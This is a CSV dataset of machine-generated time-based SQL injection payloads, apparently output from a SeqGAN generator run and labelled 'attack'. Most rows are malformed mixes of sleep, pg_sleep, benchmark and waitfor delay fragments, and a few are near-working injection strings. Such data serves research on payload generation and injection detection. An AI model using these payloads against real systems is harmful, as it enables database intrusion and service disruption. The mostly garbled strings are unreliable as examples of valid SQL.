label,payload,family,payload_type,method,run_id,sample_index
attack,"select sleep  # and from   (  select fromomd  select   (  select  (  5   )    )     )   and    (     select 6793 from pg_sleep  (  5   and     select 6969 from pg_sleep      (  5   )    )     )    and 6969  6272    (  5   )    )    <> 8594  =    (     (  5000000,md5  (  0x6d457153   )     )  sdq y like rm_mky'  =  'lerlelt  (  5000000,md5  (  5000000,md5  (  0x544d5a4c   )    where 7196  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,19
attack,1'   )    )     )   waitfor delay '0:0:5'z   )    ( or 8514  =  benchmark  (  benchmark  (  5   )    s 8594  =    (  select (  5  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,20
attack,"1 where 7196  =  benchmark  (  3114  =  benchmark  (  5000000,md5  (  select (  6272,sleep  (  5   )    )     )   --o  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,21
attack,"1'       )   where =  benchmark,pg_sleep    (  5   )    and    (     (  select 6793 from pg_sleep  (  sleep  (    (  5   )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,22
attack,select       from   (  select (  (  5   )    d qsddo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,23
attack,1 where benchmark  =  1132 from pg_sleep   (  select from   (  5  )  (  1915vgp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,24
attack,select benchmark  = from from pg_sleep  (  7305 or sleep  (  5   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,25
attack,"1  )   rlike   (  ""%""  =  4683 and 8594  =  6866",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,26
attack,select 9649 or 8466  =    (  5  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,27
attack,select pg_sleep  (  (  0x544d5a4c   )     )rr where '0:0:5' 'sa' from(  =   (  =  6272=  're   from 8594 from from pg_sleep  (  sleep  (  5   )     )   (  select * from   (  select  (  sleep  (  0x544d5a4c   )    (q  5   )    )    )    )    )     )   and from    (    (     (  select 4240 from from  (  =   (  5  )   and   (  (    (  select sleep  (  0x544d5a4c  8485 * from   (  sleep  (  3114  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,28
attack,select    (  select (  8507 where (  waitfor or '0:0:5'-- 'yfvu' 8514 from   (  select * from   (  5  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,29
attack,"select sleep  (  (  5   )    as kd5  )    )   where 1679  =  benchmark  (  =  2044 or from   (  select  (  5   )     )  sddp from elo   ,)  4683 8466  =  8252 6969 from pg_sleep  (  5   and   (    )    (  select 4240 from pg_sleep  (  0x544d5a4c   )    )    and    (    (    or 3824e  (  5000000 from   (  select  (  5  ) e and 6793  =  sdd5 benchmark  )     )    )     )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,30
attack,select benchmark  (  select  (  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,31
attack,1 4240    #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,32
attack,select 4240 benchmark  =  7021 sleep  (  9649  (  5   )    )    )     )   -- 'pyf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,33
attack,1 where delay '0:0:2' from e 6793  =    (  select * from   (  select  (  sleep  (  5   )        (  select 6793 from   (  (  6866ru,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,34
attack,1 or 8514 from   (  select  5   )    and     (     (  select 6969 from from,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,35
attack,"1'   )    and    (   (  select 3824  5000000,md5  (  select   (    (     (  select 4240 from pg_sleep  (  5   )     )   )    as k    (  0x4c4d6142   )    and    (     1132  sddo""  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,36
attack,"select sleep or 8514  =  benchmark  (  5   )     )   and    (  select * from   (  ""wucy""  =  4683 elt  (  6272  1679 8252  # or 6793  =  8252 like yf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,37
attack,1 where '0:0:2' from   )     )   )     #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,38
attack, * from pg_sleep  (  '%'  (  5  s dk  =  6383,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,39
attack,1'+  (  select 'ddkkxkk' where 1241  =  1241 waitfor delay '0:5   )    )   --u,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,40
attack,"select or 4240 from -- ""usgc",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,41
attack," * from from   (  select  sleep  (  )  (  5   )     )  szq rmq  )     )  s '0:0:2' elt  (  5   )    )     )     )   and    (     (  select 6793 sleep  (  1210  =  6272,sleep  (  (  sleep  (  5   )     )   (  select * from   (     (  sleep  (  5000000, from   (  5000000,md5  (  select,sleep  (  5   )    and    (  select delay 6969 pg_sleep  ""%""  5000000,md5  (  select from ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,42
attack,waitfor delay 9008 from from pg_sleep  (  5  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,43
attack,"select 5000000,( (  select  (  sleep  (  (  5   )     )   and    (     (  select 6793 from pg_sleep or 4240  =    meg  (  5   )    )     )  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,44
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'w)h,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,45
attack," and,md5  (  5   and e 4240  =   #u",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,46
attack,"1 where 2044  =  )  from pg_sleep  (  5   and    (    (    (    and    (     (  select  from   (  5000000,md5  (  5   )     )   or)     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,47
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmd,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,48
attack,1'  )   waitfor delay '0:0:5'ru,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,49
attack,1 or 3824  =  (  5  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,50
attack,     (  )   )     )  <> e from from       (  select  (  sleep  (  =  benchmark  (  (  5   )    )     )   -- dk  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,51
attack,"1""   )    )     )   and 8466  =  benchmark  (  5   8514 d  6272  =  7305 (  sleep  (  (  5   )     #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,52
attack,"1 or 4240  =    (  select * from   (  5000000,md5  (  5   )    )     )  #vu like 8252   )    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,53
attack,cr  )    and    (     5  s=  )  --   (  select 6969 from pg_sleep  (  (  0x544d5a4c   )     )   and    (    (     (  select 6793 from pg_sleep  (  5  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,54
attack,"1'  =  '   )    )    and   qs e '0:0:2' '0:0:5'-- from   6793    (  ""zlal""  =  6272,1",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,55
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pjyq jhq   )     )   -- kvo",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,56
attack,select sleep  (  select 4240 from pg_sleep  (  5   )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,57
attack,"1 and 8594  =  -- 9008  =  9649 6793 from,  (  6272  =  8507 rlikdyq sleep  )s from 7305  =    (  select 6969 from pg_sleep  (  select from 6793 from from from   (  5   )            (   (  1915  =    (  select from  (   (  select 4240 from pg_sleep  (  5   )   (  ""wucy"" 8514  =   (  6866",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,58
attack,"select 6383 from pg_sleep  (  =  benchmark  (  5   )    )    r)     )  sdiqe 6793  =  5874    (  '%'  =    (      (  ""uvzc"" elt  (  1210,=  from from   (  5  (ae 6969 from   (  select 4240 from from from from   (  sleep  sleep  (  sleep  (  5000000,md5  =  0x694a4745   and        (    (     (  select 6793 from pg_sleep  (  5   )    )     )   # * '0:0:5'-- from   (  select 4240 from from   ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,59
attack,"select    ""uvzc"" eu  )  sddk  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,60
attack,"1%'  )   andsdq  )   'wyvx' 6866  =    (  select 6969 from from pg_sleep  (  sleep  (  '%'  5   )    )     )  sddo  'rnzp'  =    (  select 6969 from pg_sleep  (  ""uvzc"" tasddo  )    )   <> <> elt  =  benchmark  (  5  )   #   (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,61
attack,y_u,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,62
attack,1 or 4240_    (  select  (  5   )     )     )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,63
attack, or pg_sleep  '%'  =  6866,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,64
attack,1'  )   and   'wyvx'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,65
attack,  0x76555642   # r,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,66
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'rlije   (  select 4240 from pg_sleep  (  5   )     )     )  # <> kyac",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,67
attack,"1%""  )   and   (  4683 elt  (  5   )    )    )     )    and    (    (    (     (  select 8594 from   (  select 4240 from pg_sleep  (   )  (  select 4240 from pg_sleep  (  sleep  (  5   and      sruqviyq  )   )    ru elt  (  (  (  0x544d5a4c   and 'sa' 8507  =    and    (    (    (  select 6793 from pg_sleep  (  5   )    )     )   as elt)  -- k#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,68
attack,select benchmark  (  5   )    )     )  sdkfrom '0:0:2' 2239  =    (    (  5   )    (  7196 like --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,69
attack,"select benchmark  (  5   (  sleep  select 8466  =  5000000,md5  (  (  0x4c4d6142   (  select 6969 from from   (  select    (  select and sleep  (  5   )    )     )   and    (    (   5874  0x4c4d6142#uvzc",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,70
attack,1%5  (  )   and e 6793  =    (  =    (  select 8594 and 6793  =    (  5   )    )     )uugp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,71
attack,select sleep  (  8252 or sleep  (    (     =  (  6793 --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,72
attack,"1""like   (  ""lt  6866",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,73
attack, 4240 from pg_sleep  (  benchmark  (  (  (  sleep  (  5   )    )     )   5874  =    and    (    (  select 4240 pg_sleep  (  (  0x544d5a4c   )      pg_sleep  (  )    )   (  p emq  )   (  select 8466  =  B fromt  (  select * from   (  5  0x76555642   (  select and 8466  =  from   (  5   )     )   (  select * (  =  benchmark  (  5   )    )     )   and 8514  =  1210  (  1210  (  =  7279 6793,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,74
attack,"1' where 1679  =  =  2841 r  (  5000000,md5  (  select  (  5   )    )     )     )   (  select * from   (  select  (  =  6272,,sleep  (  sleep  (  sleep  (  benchmark  (  (  5   )     )   'yfvu' 8514 e from pg_sleep  (  (  5000000,md5  (  5000000,md5  0x544d5a4c   )    )     )#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,75
attack,"1 where delay e from   (  select sleep  (  sleep  (  5   )     )   and    (    (  ""zlal""  =    (  sleep  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,76
attack,"1      and    (     5000000,md5  (  5000000,md5  (  =  benchmark  (  1210 4240 from pg_sleep  (  5   )    )     )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,77
attack,"select benchmark  (  5   )    (  select 3824  (  =  (  =  4683 and from   (  1915  select from pg_sleep  (  5000000,md5  (  5   )    )     )   and    (    (    and   (  select 4240 from   (  select  (  5   )     )   and    (   5874  select from pg_sleep  0x694a4745   )    )    where from 8514  =    (  0x694a4745   )     )   and    (    (    (    (  select 6969 from 8594 from pg_sleep  (  select 6793 from pg_sleep  (  0x4c4d6142   )    (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,78
attack,"1 and 4240  =    (  select 4240 from from pg_sleep  (  select  (  (  5000000,sleep  (  select * from elt  (  =    (  5  )     )      (  select 4240 from from pg_sleep  (  5   )    )     )  vldo  )    )   and    (    (     (  )    )     )    and    (         (  select from pg_sleep from from pg_sleep  (  5   )     )   # like --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,79
attack," sleep  (  select (  (  sleep)  (  0x544d5a4c   )     )  0x76555642     (  select 8594 from from pg_sleep  (  5000000,md5  (  5   )    )   and    (    (     ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,80
attack," 8667  (  0x544d5a4c   )    )    rlike   (  select 4240 from pg_sleep  (  5   <> e   (  select 6969 from pg_sleep  (  5   )    )    )   where from       )   -- d5  (  select d  (  5   )     )     )     )fsemd5  (  select 4240 from pg_sleep  (  5000000,md5  (  5   )    )     )   and 6793    (  select 6793 from  (  =  (  5874  8507 e 3824  =  1568 and 6793  =  5000000,md  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,81
attack,"1'+  (  select 'ddkxkxyqu asriwhere '0:0:5' 'sa' e  (  5   )        )    )     )   sruq * elt  benchmark  (  (  5000000,md55  (  select 8594 from pg_sleep  (  5   and    (  st  5874  6272 emd5  (  (  select,sleep  (  sleep  (  5000000,md5  (  5 and 6793  =    (  select * from   (  sleep  0x76555642   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,82
attack,select benchmark  (  5   )     (  select * from   (  0x76555642rrl,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,83
attack,"1 where ,'  )   waitfor delay '  (  0x76555642   (  8667 kfy e or 4240  =  benchmark  )s from   )    and elt  6272,sleep  (  (  5  )    (  ""uvzc"" 8594 rmphmdo  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,84
attack,"""   )    )    rlike sleep  (  5  )   and    (    (   ""%%j",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,85
attack,1'  )   and sleep  3672 t  'fegp' from ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,86
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'rawjy'  =  'fqru)  )   (qrru,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,87
attack,"1 or 3824  1210,,2841 (  5    )    )   -- 1679  =    (  (  select 4240 from pg_sleep  (  5   )     )   and from    (    (  select 6793 from pg_sleep  (  5   )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,88
attack,"1""   )    )     )   where from   (  select 8514  =  9008 * from   (  =  1210  (  6272  =    2841  5000000,m' where 1241  =  1241 waitfor delay '  (  3114  (  5   )    )     )  sddmk  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,89
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'kj_q  0x544d5a4c elt  (  0x544d5a4c   )    )    (     (  select 6793 from pg_sleep  (  5   )     )  )     )  )     )    r",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,90
attack,"1%' or   (  12105   and    (    (  select 6793 from "" not  =    (  select 8594 from from 4240  =  1132 6969 from   (  select  (  (  5   )    )     )     )     )   (    (  5   )    (  select 6793 4240 ""  =    (  0x694a4745select 8466 from '0:0:5' and    (    (    (  'hrta'  =  'fvtvt  =    (  select    (  select 4240 from delay from 2388  =  6175 and from   (  select 6793 from from   (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,91
attack,1 where 8252  =  7305 or 6793  =    (  select    (    (  select * from from from   (  =  =  (  5   (  select  (  5   and    (    (  select or sleep  )   )     )   )    )     )   and    (    (     -- ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,92
attack,"1"" and emie   'fegp'  =    (  select * from   (  select  (  0x4c4d6142  (  0x76555642   'fegp'zq  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,93
attack,"select and sleep  (  1210  =  1210,sleep  (  5   )     )   or 6793  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,94
attack, 'wyvx' or from   9008  5    8514  =  7305  (  5   )   6866esddo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,95
attack, select sleep  (  5   )    and    (   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,96
attack, 'yfvu' 6793 and   (  select 4240 from   (  select 6793 from from    (  0x76555642   2388       (  )    ru,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,97
attack,"select   6272,sleep  (  =  benchmark   (  5   and  ""uvzc"" where from pg_sleep  (  5000000,md5  (  sleep  (  5   )    )     )     )    )    )    rliq be sleep  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,98
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'rs ala'  =  'rrur",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,99
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""rrruc'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,100
attack," or 4240  =    (    (     (  select or e   (  select 6793 from pg_sleep  (  sleep  (  (  5   )    )     (  select 4240 from or 8514  =  (  0x694a4745   )    )     )     )   (     (  select 4240 from from pg_sleep  (    (  sleep  (  5000000,md5  (  (  7305  (  5  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,101
attack,select    (  5  )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,102
attack,1'+  (  select 'dkkxkvt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,103
attack,1 or 6793  =    (  select 8594 from pg_sleep  0x694a4745   (  select * from   (  5  =    (  5874,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,104
attack,"select pg_sleep  (  5  )   )           (  ""%""  =  'rnzcrav",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,105
attack,"1'+  (  select 'ddkxkjperlike   (  ""zlal""  2841 benchmark   from   (  5",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,106
attack,v'  =  'rawp'  =  'yac'  =  'q,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,107
attack,select 6969    where delay from ormd5  (  select 6969 pg_sleep  (  5   )    )    )     )   where delay from pg_sleep  (  select   benchmark  (  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,108
attack,"1"" or 8514  =  6272,sleep  (  5   )     )    )     )  sddo  )=  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,109
